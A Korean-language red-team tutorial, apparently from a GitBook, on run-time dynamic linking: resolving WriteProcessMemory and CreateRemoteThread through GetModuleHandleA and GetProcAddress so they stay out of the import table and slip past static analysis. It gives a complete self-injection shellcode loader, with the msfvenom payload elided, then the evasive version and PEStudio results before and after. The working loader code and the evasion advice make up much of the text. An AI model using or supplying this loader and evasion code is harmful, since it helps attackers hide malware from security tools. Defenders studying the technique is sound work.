# 런타임 다이나믹 링킹 (Run-time Dynamic Linking)

PE 파일 구조에서 Import Address Table (IAT)는 해당 파일이 사용하는 DLL의 exported 함수 포인터들을 기록해놓은 부분이다. IAT는 PE 파일 실행시 윈도우 로더 (Windows Loader) 가 PE파일을 메모리에 로드하며 해당 파일이 사용하는 DLL과 exported 함수들을 같이 맵핑 하기 위해 사용된다.

페이로드 제작시 대부분의 윈도우 API들은 직접/간접 시스템 콜을 사용하기 때문에 IAT에 수상한 윈도우 API 함수가 기록될 일은 없다. 하지만 항상 직접/간접 시스템 콜을 사용할 수 있는 것도 아니고, 가끔씩 순정 윈도우 API를 페이로드에 사용해야만 할 때가 있다. 이때 IAT에 수상한 윈도우 API(`WriteProcessMemory`, `CreateRemoteThreadEx` , 등)들이 기록되어 있다면 정적 분석에 걸리게 된다.

Run-time Dynamic Linking (런타임 다이나믹 링킹) 은 런타임 중 동적으로 DLL에서 exported 함수를 로드해 사용하는 기법이다. 이 기법을 사용하면 IAT에 수상한 윈도우 API들이 기록되지 않기 때문에 정적 분석을 통과할 확률이 높아진다. 물론 여전히 윈도우 API를 사용하는 것이고, 시스템 콜을 사용하는 것이 아니기 때문에 유저랜드 후킹이나 다른 방어 기법들에 걸리게 된다. 따라서 런타임 다이나믹 링킹은 최소한의 방어 우회 기법이다 정도로만 생각해야한다.

### 코드

런타임 다이나믹 링킹의 코드는 다음과 같은 형태로 이루어져있다.

```
// 윈도우 API 함수 포인터 구조체 생성 
typedef LPVOID(WINAPI* _VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// 필요한 문자열 unsigned char 형태로 저장 
unsigned char sKernel32[] = { 'K','e','r','n','e','l','3','2',0x0 };
unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0x0 };

// 런타임 중 DLL의 모듈 핸들을 구한 뒤 exported 함수의 핸들을 구함. 그 뒤 윈도우 API 함수 포인터 구조체로 캐스팅 (형변환)
_VirtualAlloc pVirtualAlloc = (_VirtualAlloc)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualAlloc));

... 

// 4. 이제부터 VirtualAlloc 대신 pVirtualAlloc 을 사용 
```

1. 윈도우 API 함수와 동일한 인자 및 반환을 하는 함수 포인터 (`WINAPI*`) 구조체를 생성한다.
2. 그 뒤, 필요한 문자열을 `unsigned char` 형태로 저장한다. 예를 들어 DLL의 이름인 `kernel32.dll / ntdll.dll` 이나 exported 함수 이름인 `VirtualAlloc, WriteProcessMemory, MiniDumpWriteDump` 등이다.
3. `GetModuleHandleA` 와 DLL 이름 문자열을 이용해 모듈의 핸들을 얻는다. 그 뒤, 모듈의 핸들과 exported 함수 이름을 `GetProcAddress` 함수에다 집어넣어 함수 포인터를 얻는다.
4. 이 함수 포인터를 #1 번에서 만들어 놨던 윈도우 API 함수 포인터 구조체로 캐스팅 (형변환) 한다.
5. 이제부터 해당 윈도우 API 함수를 사용하고 싶다면, #4번에서 만든 함수 포인터를 사용하면 된다.

\#3 \~ #4 번에서 런타임 중 `GetModuleHandleA` 와 `GetProcAddress` 함수가 실행되며 함수 포인터를 획득하고, 이를 윈도우 API 함수 포인터 구조체로 캐스팅하게 된다. 즉, 정적인 PE 파일 상태에서의 IAT에는 아무것도 없고, 오로지 파일이 실행돼 메모리에 로드 되고 런타임에 들어갔을 때 사용하고자 하는 윈도우 API를 함수 포인터 형태로 사용할 수 있게 된다.

### 실습

먼저 런타임 다이나믹 링킹이 적용되지 않은 간단한 셀프 인젝션 코드를 살펴본다.

```
#include <iostream>
#include <windows.h>

int main()
{
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c
	unsigned char buf[] = < ... 쉘코드 ... >

	// VirtualAlloc on self 
	HANDLE hProc = GetCurrentProcess();
	LPVOID hAlloc = (LPVOID)VirtualAlloc(NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (hAlloc == NULL) {
		printf("[-] VirtualAlloc failed: %d\n", GetLastError());
		return 1;
	}
	
	// WriteProcessMemory on self 
	SIZE_T* lpNumberOfBytesWritten = 0;
	if (!WriteProcessMemory(hProc, hAlloc, (LPVOID)buf, sizeof(buf), lpNumberOfBytesWritten)) {
		printf("[-] WPM failed: %d\n", GetLastError());
		return 1;
	}

	// CRT and execute the shellcode 
	DWORD threadId = 0; 
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, (LPDWORD)(&threadId));
	if (hThread == NULL) {
		printf("[-] CRT failed: %d\n", GetLastError());
		return 1; 
	}
	
	// WaitForSingleObject 
	WaitForSingleObject(hThread, 1000);

	return 0; 
}
```

컴파일 후 PEStudio 로 해당 파일을 살펴보면 IAT에 수상한 윈도우 API인 `WriteProcessMemory` 와 `CreateRemoteThread` 가 보인다. "Flag" 도 총 6개로, 수상한 윈도우 API 6개가 IAT에 기록되어 있다는 것을 보여준다.&#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

이제 런타임 다이나믹 링킹을 적용해보자. `WriteProcessMemory` 와 `CreateRemoteThread` 에 적용한 뒤, 다시 컴파일을 한다.

```
unsigned char sKernel32[] = { 'K','e','r','n','e','l','3','2',0x0 };

typedef BOOL(WINAPI* _WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
unsigned char sWriteProcessMemory[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0 };
_WriteProcessMemory pWriteProcessMemory = (_WriteProcessMemory)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sWriteProcessMemory));

typedef HANDLE(WINAPI* _CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
unsigned char sCreateRemoteThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0x0 };
_CreateRemoteThread pCreateRemoteThread = (_CreateRemoteThread)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateRemoteThread));

[ ... 나머지 코드 동일 ... ]
```

다시 PEStudio 로 살펴보면, IAT 에서 `WriteProcessMemory` 와 `CreateRemoteThread` 가 더이상 보이지 않는다. "Flag" 도 6개에서 4개로 줄었다.&#x20;

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

런타임 다이나믹 링킹은 간단한 정적 분석을 우회하기 위한 용도로만 사용되야한다. 중요한 윈도우 API의 경우 직접/간접 시스템 콜을 이용하거나 수동적 맵핑을 이용한 방법을 사용하도록 한다. 별로 중요하지 않지만 자주 사용되고, 직/간접 시스템 콜을 사용할 수 없는 윈도우 API (`Process32Next` 등)의 경우, 런타임 다이나믹 링킹을 적용하면 IAT 목록을 수상하지 않게 만들 수 있다.&#x20;

### References

{% embed url="https://0xrick.github.io/win-internals/pe6" %}

{% embed url="https://vanmieghem.io/blueprint-for-evading-edr-in-2022" %}
